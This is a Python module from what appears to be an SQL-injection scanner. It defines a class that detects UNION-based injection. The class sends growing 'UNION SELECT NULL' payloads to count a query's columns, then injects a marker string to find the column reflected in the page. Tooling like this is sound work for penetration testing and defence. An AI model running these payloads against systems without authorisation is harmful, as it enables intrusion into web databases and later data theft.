from __future__ import annotations

from engine.detection.base import DetectionResult
from engine.detection.signatures import has_sql_error
from engine.http.client import AsyncHttpClient
from engine.models import InjectionPoint, Technique
from engine.target import build_url

UNION_MARKER = "qCuNiOnMk"


class UnionDetector:
    """Détection UNION-based : trouve le nombre de colonnes (UNION SELECT NULL,…
    jusqu'à disparition de l'erreur) puis la colonne réfléchie (marqueur unique).

    Le comptage s'appuie sur la visibilité des erreurs de colonnes ; les cibles
    totalement muettes sont couvertes par boolean/time-blind."""

    def __init__(self, max_columns: int = 20) -> None:
        self.max_columns = max_columns

    async def detect(
        self, client: AsyncHttpClient, point: InjectionPoint
    ) -> DetectionResult | None:
        columns = await self._count_columns(client, point)
        if columns is None:
            return None
        visible = await self._find_visible_column(client, point, columns)
        if visible is None:
            return None
        return DetectionResult(
            technique=Technique.UNION,
            point=point,
            confidence=0.95,
            details=f"colonnes={columns}, colonne_visible={visible}",
        )

    async def _count_columns(
        self, client: AsyncHttpClient, point: InjectionPoint
    ) -> int | None:
        for n in range(1, self.max_columns + 1):
            payload = "UNION SELECT " + ",".join(["NULL"] * n)
            resp = await client.get(build_url(point, payload))
            if not has_sql_error(resp.text):
                return n
        return None

    async def _find_visible_column(
        self, client: AsyncHttpClient, point: InjectionPoint, columns: int
    ) -> int | None:
        for i in range(columns):
            select_list = ["NULL"] * columns
            select_list[i] = f"'{UNION_MARKER}'"
            payload = "UNION SELECT " + ",".join(select_list)
            resp = await client.get(build_url(point, payload))
            if UNION_MARKER in resp.text:
                return i + 1
        return None
